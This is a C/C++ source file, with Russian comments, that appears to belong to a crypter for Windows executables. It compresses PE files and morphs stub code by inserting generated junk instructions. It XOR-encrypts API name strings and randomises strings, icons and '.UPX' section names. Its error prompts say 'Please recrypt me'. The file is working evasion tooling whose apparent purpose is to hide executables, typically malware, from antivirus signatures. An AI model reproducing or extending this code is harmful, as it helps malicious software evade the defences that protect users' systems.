#pragma once
#define _WIN32_WINNT 0x0501
//#define WIN32_LEAN_AND_MEAN
#define _USER_MODE
//#define __PELIB_H__
//#include "source\PeLib.h"
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <math.h>
#include <memory.h>
#include <tchar.h>
#include <time.h>
#include <cstdlib>
#include <Wincrypt.h>
#include <ntundoc.h>
#include "Disassm.h"
#include "Controller.h"
#include "PE_FILE.h"
//------------------------------------------------------------------------------------------
#define ALIGN_DOWN(x, align) (x & ~(align-1))
#define ALIGN_UP(x, align) ((x & (align-1)) ?ALIGN_DOWN(x, align) + align:x)
#define MIN(a,b)  ((a)<(b)?(a):(b))
#define DEFAULT_NEW_SECTION_CHARACTERISTICS    IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE

//===========================================================================================
//********************************************************************************************
//#pragma comment(linker,"/MERGE:.rdata=.text")
//===========================================================================================
//********************************************************************************************
typedef unsigned int uint32_t;
HANDLE hHeap;
char szCurDir[MAX_PATH]={0};		//with slash
char szPluginDir[MAX_PATH]={0}; //with slash
char szPESniffer[MAX_PATH]={0};
char szSelfScan[MAX_PATH]={0};
char szGenOep[MAX_PATH]={0};
char szUPX[MAX_PATH]={0};
char szPmorph[MAX_PATH]={0};
char szMophIco[MAX_PATH]={0};
char szIcoExtract[MAX_PATH]={0};
char szSecName[MAX_PATH]={0};
BYTE gByteMorph = 0;
typedef struct tagPEFILE
{
	LPVOID pBase;
	HANDLE hFile;
	HANDLE hMap;
} PEFILE;
typedef struct _ICONDIRENTRY{
	BYTE bWidth;
	BYTE bHeight;
	BYTE bColorCount;
	BYTE bReserved;
	WORD wPlanes;
	WORD wBitCount;
	DWORD dwBytesInRes;
	DWORD dwImageOffset;
} ICONDIRENTRY, 
	* LPICONDIRENTRY;

typedef struct _ICONDIR {
	WORD idReserved;
	WORD idType;
	WORD idCount;
	ICONDIRENTRY idEntries[1];
} ICONDIR, 
	* LPICONDIR;

#pragma pack(push)
#pragma pack(2)
typedef struct _GRPICONDIRENTRY {
	BYTE bWidth;
	BYTE bHeight;
	BYTE bColorCount;
	BYTE bReserved;
	WORD wPlanes;
	WORD wBitCount;
	DWORD dwBytesInRes;
	WORD nID;
} GRPICONDIRENTRY, 
	* LPGRPICONDIRENTRY;
#pragma pack(pop)

#pragma pack(push)
#pragma pack(2)
typedef struct _GRPICONDIR {
	WORD idReserved;
	WORD idType;
	WORD idCount;
	GRPICONDIRENTRY idEntries[1];
} GRPICONDIR, 
	* LPGRPICONDIR;
#pragma pack(pop)
//-------------------------------------------------------------------------------------------
typedef BOOL	(__stdcall* _OpenPEFile)(LPSTR szFilename, PEFILE * pPE );
typedef BOOL	(__stdcall*	_AddSection)(PEFILE * pPE, LPSTR szName, DWORD dwAttributes, LPVOID pData, DWORD dwSize );
typedef void	(__stdcall*	_ClosePEFile)(PEFILE * pPE );
typedef void (WINAPI* _GenerateRubbishCode)(void* buf,DWORD dwSize, void* VirtAdr);
typedef LPSTR (WINAPI* _GetPack)(LPSTR FileName);
typedef DWORD (WINAPI* _AnalyzeFile)(char* FileName,int arg1,int arg2,char* Packer);
typedef DWORD (WINAPI* _FindOEP)(char* FileName,DWORD code);

_OpenPEFile OpenPEFile=NULL;;
_AddSection AddSection=NULL;;
_ClosePEFile ClosePEFile=NULL;;
_GetPack GetPack=NULL;
_AnalyzeFile AnalyzeFile=NULL;
_FindOEP FindOEP=NULL;
_GenerateRubbishCode __GenerateRubbishCode=NULL;
//===========================================================================================
//********************************************************************************************
#define MAX_BLOCK		1
#pragma pack (push,1)
typedef struct _SCOMP
{
	BYTE bXOR;								//CryptByte
	DWORD dwSzFull;           //Full size with base64
	DWORD dwSzCompBlock;			//size of compressed block, if == 0, then no compressed. for example arhive or jpg
	DWORD dwSzUncompBlock;		//size of uncompressed block
	DWORD dwImageBase;
	DWORD dwSizeOfImage;
	BYTE bData[0];					  //data
}SCOMP,*PSCOMP;
#pragma pack(pop)
//===========================================================================================
//********************************************************************************************
DWORD WINAPI thMsg(LPVOID szText)
{
	MessageBox(GetActiveWindow(),(char*)szText,"STOP",MB_ICONEXCLAMATION | MB_SYSTEMMODAL);
	return 0;
}
//===========================================================================================
//********************************************************************************************
VOID DPRINT(PSTR Format, ...)
{
	__try
	{
		char tmp[2000]={0};
		char tmp1[MAX_PATH]={0};
		char tmp2[2000]={0};
		va_list cur;
		va_start(cur, Format);
		vsprintf(tmp, Format, cur);
		strcat(tmp,"\n");
		if(GetModuleFileName(NULL,tmp1,MAX_PATH))
		{
			char* a = strrchr(tmp1,'\\')+1;
			strcpy(tmp2,a);
			strcat(tmp2,": ");
		}
		//printf(tmp);
		strcat(tmp2,tmp);
		OutputDebugString(tmp2);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		OutputDebugString("EXCEPT IN DPRINT");
	}
}
//===========================================================================================
//********************************************************************************************
void __ERR (char* ers)
{
	printf("@@@Error: %s!\n",ers);
	Beep(4000,100);
	system("pause");
	ExitProcess(0);
}
//===========================================================================================
/********************************************************************************************
//RANDOM DWORD*/
INT __cdecl xrand(void)
{
	int r;
	__asm
	{
		pushad
			rdtsc
			xor        edx, edx
			dec        edx
			shr        edx, 1
			and        eax, edx
			mov        r, eax
			popad
	}
	return r;
}
//===========================================================================================
//*******************************************************************************************
//RANDOM BYTE*/
BYTE xor128(BYTE minb,BYTE maxb)
{
	//srand(xrand());
	static unsigned long x=xrand(),//^rand(),
		y=362436069,
		z=521288629,
		w=88675123;
	unsigned long t;
	t=(x^(x<<11));x=y;y=z;z=w;
	w=(w^(w>>19))^(t^(t>>8));
	BYTE ret=minb+(BYTE)(w%(maxb-minb));
	if(ret<minb) ret=minb;
	if(ret>maxb) ret=maxb;
	return ret;
}
//===========================================================================================
unsigned long xor128X(DWORD dwMin, DWORD dwMax)
{
	srand(xrand());
	static unsigned long x=xrand()^rand()/*^123456789*/,y=362436069,z=521288629,w=88675123;
	unsigned long t;
	DWORD ret;
	t=(x^(x<<11));x=y;y=z;z=w; 
	w=(w^(w>>19))^(t^(t>>8));
	ret = dwMin + (w%(dwMax-dwMin));
	if(ret<dwMin) ret=dwMin;
	if(ret>dwMax) ret=dwMax;
	return ret;
}

//===========================================================================================
//*******************************************************************************************
//Генератор случайной строки*/
char* rnddstr(DWORD strlmin,DWORD strlmax,DWORD* rezLen)
{
	DWORD i=0;
	const CHAR minb=97, maxb=122;
	//printf("Strt");
	char* rst = (char*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,strlmax+1);
	if(rst)
	{
		DWORD strl;
	
		if(strlmin == strlmax) strl = strlmin; else strl=xor128X(strlmin,strlmax);
		for(i=0; i<strl;i++)
		{	
			rst[i]=xor128(minb,maxb);
			//printf("i=%d max=%d\n",i,strlmax);
		}
		if(rezLen) *rezLen = strl;
	}
	return rst;
}
//===========================================================================================
//*******************************************************************************************
///Загрузка файла в буфер, определение размера, проверка что это PE
///Выход - длина файла*/
	DWORD LoadPE(IN LPSTR szFileName,PBYTE* lpBuffer)
{
	HANDLE hFile = CreateFile(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwFileSize = GetFileSize(hFile, NULL);
		if(dwFileSize != INVALID_FILE_SIZE)
		{
			*lpBuffer = (LPBYTE)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwFileSize*10);
			if(*lpBuffer)
			{
				DWORD dwBytesRead;
				if(ReadFile(hFile, *lpBuffer, dwFileSize, &dwBytesRead, NULL)) 
				{
					CloseHandle(hFile);
					return dwFileSize;
				} else __ERR("LoadPE: ReadFile!");
			} else __ERR("LoadPE: allocate heap to file buffer!");
		} else __ERR("LoadPE: Invalid file size!");
		CloseHandle(hFile);
	}
	return 0;
}
//===========================================================================================
#define COMPRESSION_FORMAT_NONE          (0x0000)   // winnt
#define COMPRESSION_FORMAT_DEFAULT       (0x0001)   // winnt
#define COMPRESSION_FORMAT_LZNT1         (0x0002)   // winnt
#define COMPRESSION_FORMAT_XPRESS        (0x0003)   // added in Windows 8
#define COMPRESSION_FORMAT_XPRESS_HUFF   (0x0004)   // added in Windows 8

#define COMPRESSION_ENGINE_STANDARD      (0x0000)   // winnt
#define COMPRESSION_ENGINE_MAXIMUM       (0x0100)   // winnt
#define COMPRESSION_ENGINE_HIBER         (0x0200)   // winnt
//********************************************************************************************
DWORD Compressor(IN PBYTE lpUBuffer,OUT PBYTE lpCBuffer,IN DWORD uc_size,IN DWORD c_size)
{
	ULONG ws_size, fs_size,res_size;
	DWORD COMPRESS = COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM;
	NTSTATUS status= RtlGetCompressionWorkSpaceSize(COMPRESS, &ws_size, &fs_size);
	if (NT_SUCCESS(status)) 
	{
		PVOID  workspace = (PVOID) malloc(ws_size);
		RtlZeroMemory(workspace,ws_size);
		if(workspace!=NULL)
		{
			RtlZeroMemory(lpCBuffer,c_size);
			status = RtlCompressBuffer(COMPRESS,lpUBuffer,uc_size,lpCBuffer,c_size,0x1000,&res_size,workspace);
			free(workspace);
			if(NT_SUCCESS(status))
			{
				return res_size;
			}
		}
	}
	__ERR("Compressor");
	return 0;
}

//===========================================================================================
//*******************************************************************************************
DWORD DeCompressor(IN PUCHAR lpCBuffer,OUT PUCHAR lpUBuffer,IN ULONG c_size,IN ULONG uc_size)
{
	ULONG res_size=0;
	int status = RtlDecompressBuffer(0x0002,lpUBuffer,uc_size,lpCBuffer,c_size,&res_size);
	if(!NT_SUCCESS(status)) __ERR("DeCompressor");
	return res_size;
}
//===========================================================================================
//*******************************************************************************************
//Создание файла и запись в него буфера
HANDLE CreatePE(IN BOOL b_Close,IN PCHAR sz_dFile,IN PBYTE lpBuffer,IN DWORD dwSz)
{
	DeleteFile(sz_dFile);
	HANDLE hFile = CreateFile(sz_dFile, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if(hFile == INVALID_HANDLE_VALUE) __ERR("CreatePE");
	DWORD dwBytesWritten;
	if(!WriteFile(hFile, lpBuffer, dwSz, &dwBytesWritten, NULL))
	{
		__ERR("CreatePE");
		return INVALID_HANDLE_VALUE;
	}
	FlushFileBuffers(hFile);
	if(b_Close) CloseHandle(hFile); else return hFile;
	return NULL;
}
//===========================================================================================
//*******************************************************************************************
int mul_lb(uint32_t x, uint32_t a)
{
	uint32_t r = 0, f = 0, n = 0;
	while (x >= 2) {
		f = (f >> 1) | ((x & 1) << 31);
		r++, n++, x >>= 1;
	}
	if (n) {
		if (++n > 16)
			n = 16;
		f = ((f >> 1) | 0x80000000) >> (32 - n);
		r *= a;
		while (a > 1) {
			f *= f, f >>= n, a >>= 1;
			if ((f >> (--n - 1)) >= 2)
				r += a, f >>= 1;
		}
	}
	return r;
}

long double entropy(BYTE* b, int l)
{
	int i, e = 0;
	uint32_t c[256];
	ZeroMemory(c, sizeof(c));
	for (i = 0; i < l; i++)
		c[b[i]]++;
	for (i = 0; i < 256; i++)
		if (c[i] > 1)
			e -= mul_lb(c[i], c[i]);
	e /= l >> 5;
	e += mul_lb(l, 32);
	if (e > 255)
		e = 255;
	//
	//printf("E=%d (%f)\n", e, e / 32.0);
	return e / 32.0;
}
//===========================================================================================
//*******************************************************************************************
/*Расчёт энтропии буфера*/
long double EntropyB(IN BYTE* pbBuf,IN UINT total_bytes)
{
	int byte_counters[256];
	memset(byte_counters, 0, sizeof(int) * 256);
	for(UINT i=0;i<total_bytes;i++) 
	{
		byte_counters[pbBuf[i]]++;
	}
	long double h = 0.0;
	for (UINT i=0; i<256; i++) 
	{
		long double p_i  = (long double)byte_counters[i] / (long double)total_bytes;
		if (p_i > 0.0)
		{
			h -= p_i * ((long double)log(p_i) / (long double)log((long double)2));
		}
	}
	return h;
}
//===========================================================================================
//*******************************************************************************************
DWORD ALIGNDOWN(DWORD addr, DWORD align)
{
	return (addr & ~(align - 1));
}

DWORD ALIGNUP(DWORD addr, DWORD align)
{
	return ((addr & (align - 1)) ? ALIGNDOWN(addr, align) + align : addr);
}
DWORD CalcSizeOfImage(IN PIMAGE_SECTION_HEADER pISH,IN DWORD FileAlignment,IN DWORD SectionAlignment,OUT DWORD* SizeOfCode,OUT DWORD* SizeOfInitializedData)
{
	DWORD ImageSize = 0;
	DWORD SizeOfUninitializedData = 0;
	DWORD TmpFlags = pISH->Characteristics & (IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA |	IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_LNK_OTHER);
	if (TmpFlags == IMAGE_SCN_CNT_CODE)
		*SizeOfCode = *SizeOfCode + ALIGNUP(pISH->Misc.VirtualSize, FileAlignment);
	else if (TmpFlags == IMAGE_SCN_CNT_INITIALIZED_DATA)
			*SizeOfInitializedData = *SizeOfInitializedData + ALIGNUP(pISH->Misc.VirtualSize, FileAlignment);
	ImageSize = ImageSize + ALIGNUP(ALIGNUP(pISH->Misc.VirtualSize, FileAlignment), SectionAlignment);
	return ImageSize;
}
//===========================================================================================
//*******************************************************************************************
//int AddSectionWithData(const char* cszFile,const char* cszSection, unsigned int uSectionSize,	const char* cszData,	unsigned int uDataSize, unsigned int number,unsigned int flag)
//{
//	int iResult = NO_ERROR;
//	unsigned short sSecn = 0;
//
//	PeLib::PeFile32* pef = reinterpret_cast<PeLib::PeFile32*>( PeLib::openPeFile(cszFile) );
//	if( !pef )
//	{
//		printf("Error 0\n");
//		return PeLib::ERROR_INVALID_FILE;       // Not a PE file.
//	}
//
//	// Read Headers.
//	if( (iResult = pef->readMzHeader()) != NO_ERROR )
//	{
//		printf("Error 1\n");
//		return iResult; 
//	}
//
//	if( (iResult = pef->readPeHeader()) != NO_ERROR )
//	{
//		printf("Error 2\n");
//		return iResult;
//	}
//
//	// Write Section into PE Header
//	if( (iResult = pef->peHeader().addSection( cszSection, uSectionSize,flag))!= NO_ERROR )
//	{
//		printf("Error 3\n");
//		return iResult;
//	}
//
//	// Realign all Sections.
//	if( (iResult = pef->peHeader().writeSections( cszFile )) != NO_ERROR )
//	{
//		printf("Error 4\n");
//		return iResult;
//	}
//
//	pef->peHeader().makeValid( pef->mzHeader().getAddressOfPeHeader() );
//
//	// Write the new (hopefully valid) PE Header onto the physical File.
//	if( (iResult = pef->peHeader().write( cszFile, pef->mzHeader().getAddressOfPeHeader() )) != NO_ERROR )
//	{
//		printf("Error 7\n");
//		return iResult;
//	}
//
//	// Write Code into new created Section.
//	std::vector<PeLib::byte> vecData( (PeLib::byte*)cszData, (PeLib::byte*)cszData + uDataSize );
//
//	if( (iResult = pef->peHeader().writeSectionData( cszFile, number, vecData )) != NO_ERROR )
//	{
//		printf("Error 7\n");
//		return iResult;
//	}
//	unsigned sizeofimage = pef->peHeader().calcSizeOfImage();
//	//printf("SizeOfUsefulImage: 0%X\n",sizeofimage);
//	pef->peHeader().makeValid(pef->mzHeader().getAddressOfPeHeader());
//	// Write the new (hopefully valid) PE Header onto the physical File.
//	pef->peHeader().write( cszFile, pef->mzHeader().getAddressOfPeHeader());
//	//pef->peHeader().rebuild(cszFile);
//	return NO_ERROR;
//}
//
//void CreateExe(char* szFileName, char* ldata,DWORD sizeData)
//{
//	std::string strFilename = szFileName;//"dummy.exe";
//
//	PeLib::PeFile32 f(strFilename);
//
//	unsigned int uiSizeMzHeader = f.mzHeader().size();
//
//	// At first we need a valid MZ header.
//	std::cout << "Building MZ header..." << std::endl;
//	f.mzHeader().setAddressOfPeHeader(uiSizeMzHeader);
//	f.mzHeader().makeValid();
//	f.mzHeader().write(strFilename, 0);
//
//	// Then we need a valid PE header.
//	std::cout << "Building PE header..." << std::endl;
//	f.peHeader().setAddressOfEntryPoint(0x1000);
//	f.peHeader().makeValid(uiSizeMzHeader);
//
//	// We need a section for the code.
//	std::cout << "Building Sections..." << std::endl;
//
//	f.peHeader().addSection(".text",ALIGNUP(sizeData,0x200),IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA);
//	//f.peHeader().addSection(".data", 0x200,IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA);
//	/*f.peHeader().addSection("A", 0x200,IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA);
//	f.peHeader().addSection("B", 0x200,IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA);
//	f.peHeader().addSection("C", 0x200,IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA);*/
//	unsigned uiImpDir = f.peHeader().getVirtualAddress(0) + 0x100;
//
//	// After the section was added the PE header needs to be updated.
//	// At least 5 directories need to exist in a valid PE file even though only the second
//	// one will be used.
//	f.peHeader().addDataDirectory();
//	f.peHeader().addDataDirectory();
//	f.peHeader().addDataDirectory();
//	f.peHeader().addDataDirectory();
//	f.peHeader().addDataDirectory();
//	f.peHeader().addDataDirectory();
//	f.peHeader().addDataDirectory();
//	f.peHeader().addDataDirectory();
//	f.peHeader().addDataDirectory();
//	f.peHeader().setIddImportRva(uiImpDir);
//	f.peHeader().setIddImportSize(f.impDir().size());
//	f.peHeader().setImageBase(0x00400000);
//	f.peHeader().setMajorSubsystemVersion(4);
//	f.peHeader().setSubsystem(2);
//	f.peHeader().makeValid(uiSizeMzHeader);
//
//	f.peHeader().write(strFilename, uiSizeMzHeader);
//
//	// Write the new section to the output file.
//	f.peHeader().writeSections(f.getFileName());
//	// Dummy.exe needs to import User32.dll's MessageBoxA to use it.
//	std::cout << "Building Import Directory..." << std::endl;
//	f.impDir().addFunction("User32.dll", "MessageBoxA");
//	f.impDir().write(strFilename, f.peHeader().rvaToOffset(uiImpDir), uiImpDir);
//
//	// Program code created with an assembler.
//	//char data[] = { 0x6A, 0x00,	// push	0
//	//	0x68, 0x00, 0x00, 0x00, 0x00,	// push "PeLib"
//	//	0x68, 0x00, 0x00, 0x00, 0x00,	// push "Built with PeLib"
//	//	0x6A, 0x00,	// push 0
//	//	0xFF, 0x15, 0x00, 0x00, 0x00, 0x00,	// call MessageBoxA
//	//	0xC3,	// ret
//	//	'B','u','i','l','t',' ',	// Data string
//	//	'w','i','t','h',' ',
//	//	'P','e','L','i','b',0x00};
//
//	//unsigned int uiOffset = f.peHeader().getPointerToRawData(0);
//
//	// Update the program code with the necessary addresses for data and calls
//	//*(PeLib::dword*)(&data[3]) = f.peHeader().offsetToVa(uiOffset + 32);
//	//*(PeLib::dword*)(&data[8]) = f.peHeader().offsetToVa(uiOffset + 21);
//	//*(PeLib::dword*)(&data[16]) = f.peHeader().rvaToVa(uiImpDir + 0x28);
//
//	// Write program code to file.
//	std::cout << "Writing data..." << std::endl;
//	std::vector<PeLib::byte> vData(ldata, ldata + sizeData/sizeof(ldata[0]));
//	f.peHeader().writeSectionData(f.getFileName(), 0, vData);
//
//}
//********************************************************************************************
//МОРФИНГ

//Морфинг буфера с метками hlt,cli,cld */
BOOL Morpher(IN BOOL b_Morph,IN PBYTE lpBuffer,IN DWORD dwSz)
{
	DWORD dwSizeBuff = 4096;
	BOOL bRet = FALSE;
	//Поиск маркеров в стабе
	int cnt = 0;
	LPBYTE bBuf = (LPBYTE)VirtualAlloc(NULL,dwSizeBuff,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	DWORD jj=0;	//Счётчик Nop - ов + 3 байта hlt,cli,cld
	for(DWORD i=0;i<dwSz;i++)
	{
		//Поиск сигнатурных меток
		if(lpBuffer[i]==0xF4 && lpBuffer[i+1]==0xFA && lpBuffer[i+2]==0xFC)
		{
			//Подсчёт Nop - ов
			jj=3;
			while(lpBuffer[i+jj]==0x90 || (lpBuffer[i+jj]==0xC3 && lpBuffer[i+jj+1]==0xC3) || (lpBuffer[i+jj]==0xCC && lpBuffer[i+jj+1]==0xCC))
			{
				jj++;
			}
			if(b_Morph && __GenerateRubbishCode!=NULL)
			{
				//морфинг найденного блока, если задано
				memset(bBuf,0,dwSizeBuff);
				DWORD dwOldProt;
				__GenerateRubbishCode(bBuf,jj,0);
				BYTE bTmp = bBuf[jj];
				__try
				{
					bBuf[jj]=0xC3;
					__asm
					{
						pushad
						call bBuf
						popad
					}
				}
				__except(EXCEPTION_EXECUTE_HANDLER)
				{
					Beep(4000,100);
					WaitForSingleObject(CreateThread(NULL,0,thMsg,"Error in Morpher!\nPlease recrypt me!!!",0,NULL),INFINITE);
					printf("Error  in Morpher!\n");
					ExitProcess(-1);
				}
				bBuf[jj]=bTmp;
				memcpy(&lpBuffer[i],bBuf,jj);
				i+=jj;
			}
			else
			{
				//Затирание маркерв Nop-ами, если не задан морфинг
				lpBuffer[i]=0x90; lpBuffer[i+1]=0x90;	lpBuffer[i+2]=0x90;// lpBuffer[i+jj]=0x90;
			}
			cnt++;
			printf("%2d Morphed code in offset: 0x%X, Size: %d\n",cnt,i,jj);
			bRet = TRUE;
		}
	}
	VirtualFree(bBuf,dwSizeBuff,MEM_DECOMMIT);
	return bRet;
}
//===========================================================================================
//Морфинг буфера с метками cli,cld,hlt */
BOOL IcoMorph(IN PBYTE lpBuffer,IN DWORD dwSz)
{
	BOOL bRet = FALSE;
	int cnt = 0;
	//Поиск маркеров в стабе
	DWORD jj=0;	//Счётчик Nop - ов + 3 байта hlt,cli,cld
	for(DWORD i=0;i<dwSz;i++)
	{
		//Поиск сигнатурных меток
		if(lpBuffer[i]==0xEE && lpBuffer[i+1]==0xEE && lpBuffer[i+2]==0xEE && lpBuffer[i+3]==0xEE && lpBuffer[i+4]==0xEE)
		{
			//MessageBoxA(NULL,"Y",0,0);
			//printf("Found mask in offset: 0x%X\n",i);
			//Подсчёт Nop - ов или нулей
			while(lpBuffer[i+jj]==0x00)// || lpBuffer[i+jj]==0x78 || lpBuffer[i+jj]==0x7F || lpBuffer[i+jj]==0xEE || (lpBuffer[i+jj]==0xFF) || (lpBuffer[i+jj]==0x77) || (lpBuffer[i+jj]==0x88))
			{
				lpBuffer[i+jj] = xor128(100,255);
				jj++;

			
			}
			cnt++;
			printf("Morphing icon data in offset: 0x%X, Size: %d\n",i,jj);
			bRet = TRUE;
		}
	}
	return bRet;
}
//===========================================================================================
char szSEC[255]={0};
//Морфинг буфера с метками cli,cld,hlt */
BOOL SectionMorph(IN PBYTE lpBuffer,IN DWORD dwSz)
{
	
	BOOL bRet = FALSE;
	int cnt = 0;
	//Поиск маркеров в стабе
	DWORD jj=0;	//Счётчик Nop - ов + 3 байта hlt,cli,cld
	for(DWORD i=0;i<dwSz;i++)
	{
		//Поиск сигнатурных меток
		if(lpBuffer[i]=='.' && lpBuffer[i+1]=='U' && lpBuffer[i+2]== 'P' && lpBuffer[i+3]=='X' /*&& lpBuffer[i+4]==0x73 && lpBuffer[i+5]==0x7A && lpBuffer[i+6]==0x6C*/)
		{
			//printf("Found mask SECTION!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
			//lpBuffer[i]  ='.';//szSecName[0];
			lpBuffer[i+1]=szSecName[1];
			lpBuffer[i+2]=szSecName[2];
			lpBuffer[i+3]=szSecName[3];
			/*lpBuffer[i+4]=szSecName[4];
			lpBuffer[i+5]=szSecName[5];
			lpBuffer[i+6]=szSecName[6];
			lpBuffer[i+7]=szSecName[7];
			lpBuffer[i+8]=szSecName[8];*/
			//MessageBoxA(NULL,szSecName,0,0);
			bRet = TRUE;
		}
	}
	return bRet;
}
//===========================================================================================
//Морфинг буфера данных(криптострок) для GetProcAddres с метками (0xFB,0xFC,0xFE,0xFF,0xAA) от НОДА
BYTE xDataMorph(IN PBYTE lpBuffer,IN DWORD dwSz)
{
__RESTART:
	BYTE bRnd = 0;
	int cnt = 0;
	//Поиск маркеров в стабе
	for(DWORD i=0;i<=dwSz;i++)
	{
		DWORD jj=2;	//Счётчик
		int u;
		//Поиск сигнатурных меток
		if((lpBuffer[i]==0xFB && lpBuffer[i+1]==0xFC && lpBuffer[i+2]==0xFE && lpBuffer[i+3]==0xFF && lpBuffer[i+4]==0xAA))
		{
			//Считаем длину шифруемой строки
			for(u=0;lpBuffer[u+i+5]!=0;u++)
			{
				__asm nop
			}
			if(lpBuffer[u+i+6]==0x7)
			{
				printf("LEN=%d\n",u);
	__LREP:
				bRnd = xor128(0,255);
				lpBuffer[i] = bRnd;
				while(lpBuffer[jj+i]>0)
				{
					BYTE bT= lpBuffer[jj+i];
					lpBuffer[jj+i] = lpBuffer[jj+i]^bRnd;
					if(lpBuffer[jj+i] <=0 )
					{
						//Beep(4000,50);
						while(jj!=2)
						{
							lpBuffer[jj+i] = lpBuffer[jj+i]^bRnd;
							jj--;
						}
						jj=2;
						goto __LREP;
					}
					jj++;
				}
				cnt++;
				lpBuffer[i+1] = jj-5;
				printf("%2d: Morphing founded FUNC NAME data, len=%d in offset: 0x%X, key = 0x%X\n",cnt,lpBuffer[i+1],i,bRnd);
				if(lpBuffer[i+1]!=u) 
				{
					Beep(4000,100);
					WaitForSingleObject(CreateThread(NULL,0,thMsg,"Error xDataMorph!\nPlease recrypt me!!!",0,NULL),INFINITE);
					printf("Error xDataMorph!\n");
					ExitProcess(-1);
				};//
			}
		}
	}
	return bRnd;
}
//===========================================================================================
//Морфинг буфера данных с метками cli,cld,hlt (0xFA,0xFC,0xF4)*/
BOOL DataMorph(IN BOOL bMorph,IN PBYTE lpBuffer,IN DWORD dwSz)
{
	BYTE bRnd = xor128(0,255);
	BOOL bRet = FALSE;
	int cnt = 0;
	//Поиск маркеров в стабе
	for(DWORD i=0;i<=dwSz;i++)
	{
		DWORD jj=0;	//Счётчик Nop - ов
		//Поиск сигнатурных меток
		if((lpBuffer[i]==0xFA && lpBuffer[i+1]==0xFC && lpBuffer[i+2]==0xF4) || (lpBuffer[i]== 0xF4 && lpBuffer[i+1]==0xFC && lpBuffer[i+2]== 0xFA))
		{
			if(bMorph)
			{
				lpBuffer[i] = xor128(0,255); lpBuffer[i+1] = xor128(0,255); lpBuffer[i+2] = xor128(0,255); lpBuffer[i+3] = xor128(0,255); 
			}
			else
			{
				lpBuffer[i] = 0; lpBuffer[i+1] = 0; lpBuffer[i+2] = 0; 
			}
			////Подсчёт Nop - ов или нулей или int 3
			//jj=4;
			//while(lpBuffer[i+jj]==0x90 || (lpBuffer[i+jj]==0) || (lpBuffer[i+jj]==0xCC))
			//{
			//	if(bMorph) lpBuffer[i+jj] = xor128(0,255); else lpBuffer[i+jj] = 0;
			//	jj++;
			//}
			cnt++;
			printf("%2d: Morphing founded DWORD data in offset: 0x%X\n",cnt,i);
			bRet = TRUE;
		}
	}
	return bRet;
}
//===========================================================================================
//Морфинг буфера с метками 'm','O','r',..'x'..,'\0' */
//максимальная длина 255
BOOL StringMorph(IN PBYTE lpBuffer,IN DWORD dwSz)
{
	BOOL bRet = FALSE;
	int ascii_cnt = -1;
	int unicode_cnt = -1;
	int cnt = 0;
	bool f_uni = false;
	bool f_ascii = false;
	//Поиск маркеров в стабе
	DWORD jj=0;	//Счётчик
	for(DWORD i=0;i<dwSz;i++)
	{
		//Поиск сигнатурных меток
		if((lpBuffer[i]=='m' && lpBuffer[i+1]=='O' && lpBuffer[i+2]=='r' && lpBuffer[i+3]=='x') || (lpBuffer[i]=='m' && lpBuffer[i+2]=='O' && lpBuffer[i+4]=='r' && lpBuffer[i+6]=='x'))
		{
			DWORD dwResLen=0;
			if((lpBuffer[i]=='m' && lpBuffer[i+2]=='O' && lpBuffer[i+4]=='r'))
			{
				//Unicode
				lpBuffer[i]=rnddstr(1,255,&dwResLen)[0];
				lpBuffer[i+2]=rnddstr(1,255,&dwResLen)[0];
				lpBuffer[i+4]=rnddstr(1,255,&dwResLen)[0];
				jj=6;
				unicode_cnt = 0;
				f_uni = true;
				cnt++;
			}
			else
			{
				//ASCII
				lpBuffer[i]=rnddstr(1,255,&dwResLen)[0];
				lpBuffer[i+1]=rnddstr(1,255,&dwResLen)[0];
				lpBuffer[i+2]=rnddstr(1,255,&dwResLen)[0];
				jj=3;
				ascii_cnt = 0;
				f_ascii = true;
				cnt++;
			}
			//Подсчёт масок 'x'
			while(lpBuffer[i+jj]=='x')
			{
				lpBuffer[i+jj] = rnddstr(1,255,&dwResLen)[0];
				if(lpBuffer[i+jj+1]==0) jj++; //Unicode
				jj++;
			}
			if(ascii_cnt>=0 && f_ascii) ascii_cnt++;
			if(unicode_cnt>=0 && f_uni)unicode_cnt++;
			if(ascii_cnt>0 && f_ascii) {printf("%2d: Morphing ASCII string in offset: 0x%X, Size: %d\n",cnt,i,jj); f_ascii=false;}
			if(unicode_cnt>0 && f_uni){ printf("%2d: Morphing UNICODE string in offset: 0x%X, Size: %d\n",cnt,i,jj); f_uni = false;}
			bRet = TRUE;
		}
	}
	return bRet;
}
//********************************************************************************************
	DWORD round(DWORD dwSize,DWORD dwAlignment,DWORD dwAddress)
	{
		if (dwSize % dwAlignment == 0)
		{		
			return dwAddress + dwSize;
		}
		else return dwAddress + (dwSize/dwAlignment + 1) * dwAlignment;
	}
	typedef struct{	char* szName;	WORD UsedAlready;} whatever;
